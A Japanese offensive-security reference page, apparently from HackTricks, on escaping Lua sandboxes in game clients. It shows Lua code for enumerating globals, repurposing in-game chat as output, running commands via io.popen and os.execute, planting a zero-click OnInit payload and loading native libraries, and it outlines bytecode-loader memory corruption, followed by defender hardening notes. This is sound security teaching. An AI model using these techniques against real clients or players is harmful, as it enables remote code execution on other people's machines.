# Lua サンドボックスを回避する（組み込みVM、ゲームクライアント）

{{#include ../../../banners/hacktricks-training.md}}

このページは、アプリケーション（主にゲームクライアント、プラグイン、またはアプリ内スクリプトエンジン）に組み込まれたLua「サンドボックス」を列挙し脱出するための実践的な手法をまとめたものです。多くのエンジンは制限されたLua環境を公開しますが、強力なグローバルが到達可能なまま残されていることがあり、bytecode loadersが露出している場合は任意のコマンド実行やネイティブメモリ破壊を引き起こすこともあります。

Key ideas:
- VMを未知の環境として扱う: _Gを列挙して、どの危険なプリミティブが到達可能かを発見する。
- stdout/printがブロックされている場合は、in-VMのUI/IPCチャネルを出力先として悪用し、結果を観察する。
- io/osが公開されている場合、io.popenやos.executeなどで直接コマンド実行できることが多い。
- load/loadstring/loadfileが公開されている場合、作成したLua bytecodeを実行することで一部のバージョンでメモリ安全性を破ることがあり（≤5.1ではverifierが回避可能、5.2でverifierは削除）、高度なエクスプロイトが可能になる。

## サンドボックス化された環境の列挙

- 到達可能なテーブル/関数を一覧化するため、グローバル環境をダンプする:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- print() が利用できない場合は、in-VM channels を再利用する。MMO の housing script VM の例では、chat output は sound call の後でしか動作しない。以下は信頼できる output function を構築する例：
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
このパターンをターゲットに一般化すると: 任意のtextbox、toast、logger、または文字列を受け取るUI callbackはreconnaissanceのためのstdoutとして機能し得ます。

## io/osが露出している場合の直接的なコマンド実行

もしsandboxが標準ライブラリのioやosをまだ露出しているなら、おそらく即時にコマンド実行が可能です:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
注意:
- 実行はクライアントプロセス内で行われる。外部デバッガをブロックする多くの anti-cheat/antidebug レイヤは、VM内でのプロセス作成を妨げない。
- また確認: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).

## Zero-click triggers via auto-run callbacks

ホストアプリケーションがクライアントにスクリプトをプッシュし、VMが auto-run hooks（例: OnInit/OnLoad/OnEnter）を公開している場合、スクリプトがロードされ次第、そこに payload を置いて drive-by compromise を行う:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
スクリプトがクライアントに自動的に送信され実行される場合、同等のコールバック（OnLoad、OnEnter など）はこの手法を一般化します。

## Recon 中に探すべき危険なプリミティブ

_G 列挙中は、特に次を探す:
- io, os: io.popen, os.execute, ファイル I/O、環境（env）へのアクセス。
- load, loadstring, loadfile, dofile: ソースまたはバイトコードを実行する; 信頼できないバイトコードのロードをサポートする。
- package, package.loadlib, require: 動的ライブラリのロードとモジュールの表面（API）。
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, およびフック。
- LuaJIT-only: ffi.cdef, ffi.load — ネイティブコードを直接呼び出すために使用される。

最小限の使用例（到達可能であれば）：
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## オプションのエスカレーション: Lua bytecode loaders の悪用

load/loadstring/loadfile が到達可能で io/os が制限されている場合、細工された Lua bytecode の実行はメモリ開示や破損プリミティブに繋がる可能性がある。主なポイント:
- Lua ≤ 5.1 には既知のバイパスがある bytecode verifier が搭載されていた。
- Lua 5.2 は verifier を完全に削除した（公式見解：アプリケーションは precompiled chunks を拒否すべき）、そのため bytecode loading が禁止されていない場合に攻撃面が拡大する。
- 一般的なワークフロー: in-VM 出力経由で pointers を leak し、type confusions を生み出すよう bytecode を作成（例: FORLOOP や他の opcodes 周辺）、そこから arbitrary read/write や native code execution にピボットする。

この経路はエンジン／バージョン依存で RE を要する。詳細な解析、exploitation primitives、ゲームにおける例示的な gadgetry については参考文献を参照。

## 検出とハードニングの注意点（防御者向け）

- Server side: reject or rewrite user scripts; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: run Lua with a minimal _ENV, forbid bytecode loading, reintroduce a strict bytecode verifier or signature checks, and block process creation from the client process.
- Telemetry: alert on gameclient → child process creation shortly after script load; correlate with UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
